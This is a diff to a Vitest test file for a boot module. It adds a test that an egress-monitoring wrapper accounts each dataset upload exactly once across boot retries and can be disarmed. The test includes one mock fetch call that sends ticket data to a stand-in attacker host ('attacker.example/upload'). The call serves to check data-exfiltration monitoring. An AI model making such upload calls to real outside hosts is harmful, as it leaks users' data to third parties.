@@ -1,6 +1,8 @@
 // @vitest-environment jsdom
 import { describe, expect, it, vi } from "vitest";
-import { BOOT_PLAN, findRootContainer, start } from "./boot";
+import { armOnce, BOOT_PLAN, findRootContainer, start, warmDefault } from "./boot";
+import type { CustodyKernel } from "../dataset-custody/kernel";
+import type { EgressScope } from "../dataset-custody/egress";
 
 // Registration is terminal by design (no unregisterTool): a boot that reached
 // register must keep its memo so a retry can never double-register. Mocked so
@@ -41,6 +43,39 @@ describe("findRootContainer", () => {
   it("throws the pinned error when #root is missing", () => {
     const doc = { querySelector: () => null };
     expect(() => findRootContainer(doc)).toThrow("boot: #root container is missing from index.html");
+  });
+});
+
+describe("egress arming is idempotent across boot retries", () => {
+  it("a second warm never stacks wrappers: one send is accounted exactly once", async () => {
+    const originalFetch = (input: unknown, init?: { body?: unknown }) => Promise.resolve({ input, init });
+    let uploads = 0;
+    let coverage: readonly string[] = [];
+    const kernel = {
+      datasetPayloadBytes: () => 42,
+      recordDatasetUpload: (bytes: number) => {
+        uploads += bytes;
+      },
+      recordTransportCoverage: (next: readonly string[]) => {
+        coverage = next;
+      },
+    } as unknown as CustodyKernel;
+    const scope = { fetch: originalFetch } as EgressScope & {
+      fetch: typeof originalFetch;
+    };
+    const warm = () => Promise.resolve();
+
+    await warmDefault({ scope, kernel, warm });
+    await warmDefault({ scope, kernel, warm });
+    // Coverage was recorded, never doubled.
+    expect(coverage).toEqual(["fetch"]);
+
+    await scope.fetch("https://attacker.example/upload", { body: { values: { tickets: [1] } } });
+    expect(uploads).toBe(42);
+
+    // The memoized monitor is still the disarm escape hatch.
+    armOnce(scope, kernel).disarm();
+    expect(scope.fetch).toBe(originalFetch);
   });
 });
 
